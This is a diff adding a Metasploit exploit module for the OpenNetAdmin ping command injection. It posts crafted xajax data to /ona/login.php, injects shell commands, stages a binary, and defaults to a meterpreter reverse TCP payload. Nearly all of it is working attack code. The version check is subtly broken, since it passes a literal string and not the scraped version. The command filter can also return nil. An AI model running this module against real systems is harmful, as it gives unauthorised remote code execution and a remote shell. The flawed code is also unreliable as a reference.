@@ -1,0 +1,104 @@
+class MetasploitModule < Msf::Exploit::Remote
+  Rank = ExcellentRanking
+
+  include Msf::Exploit::Remote::HttpClient
+  include Msf::Exploit::CmdStager
+  def initialize(info = {})
+    super(update_info(info,
+      'Name'            => 'OpenNetAdmin Ping Command Injection',
+      'Description'     => %q{
+        This module exploits a command injection in OpenNetAdmin between 8.5.14 and 18.1.1.
+      },
+      'Author'          =>
+        [
+          'mattpascoe', # Vulnerability discovery
+          'Onur ER <onur@onurer.net>' # Metasploit module
+        ],
+      'References'      =>
+        [
+          ['EDB', '47691']
+        ],
+      'DisclosureDate'  => '2019-11-19',
+      'License'         => MSF_LICENSE,
+      'Platform'        => 'linux',
+      'Arch'            => [ARCH_X86, ARCH_X64],
+      'Privileged'      => false,
+      'Targets'         =>
+        [
+          ['Automatic Target', {}]
+        ],
+      'DefaultOptions'  =>
+        {
+          'RPORT'   => 80,
+          'payload' => 'linux/x86/meterpreter/reverse_tcp'
+        },
+      'DefaultTarget'   => 0))
+
+    register_options(
+      [
+        OptString.new('VHOST', [false, 'HTTP server virtual host']),
+        OptString.new('TARGETURI', [true, 'Base path', '/ona/login.php'])
+      ]
+    )
+  end
+
+  def check
+    res = send_request_cgi({
+      'method'        => 'POST',
+      'uri'           => normalize_uri(target_uri.path),
+      'ctype'         => 'application/x-www-form-urlencoded',
+      'encode_params' => false,
+      'vars_post'     => {
+        'xajax'       => 'window_open',
+        'xajaxargs[]' => 'app_about'
+      }
+     })
+
+    unless res
+      vprint_error 'Connection failed'
+      return CheckCode::Unknown
+    end
+
+    unless res.body =~ /OpenNetAdmin/i
+      return CheckCode::Safe
+    end
+
+    opennetadmin_version = res.body.scan(/OpenNetAdmin - v([\d\.]+)/).flatten.first
+    version = Gem::Version.new('opennetadmin_version')
+
+    if version
+      vprint_status "OpenNetAdmin version #{version}"
+    end
+
+    if version >= Gem::Version.new('8.5.14') && version <= Gem::Version.new('18.1.1')
+      return CheckCode::Appears
+    end
+
+    CheckCode::Detected
+  end
+
+  def exploit
+    print_status('Exploiting...')
+    execute_cmdstager(flavor: :printf)
+  end
+
+  def filter_bad_chars(cmd)
+    cmd.gsub!(/chmod \+x/, 'chmod 777')
+  end
+
+  def execute_command(cmd, opts = {})
+    post_data = "xajax=window_submit&xajaxargs[]=tooltips&xajaxargs[]=ip%3D%3E;#{filter_bad_chars(cmd)};&xajaxargs[]=ping"
+
+    begin
+      send_request_cgi({
+        'method'        => 'POST',
+        'uri'           => normalize_uri(target_uri.path),
+        'ctype'         => 'application/x-www-form-urlencoded',
+        'encode_params' => false,
+        'data'          => post_data
+      })
+    rescue ::Rex::ConnectionError
+      fail_with(Failure::Unreachable, "#{peer} - Failed to connect to the web server")
+    end
+  end
+end
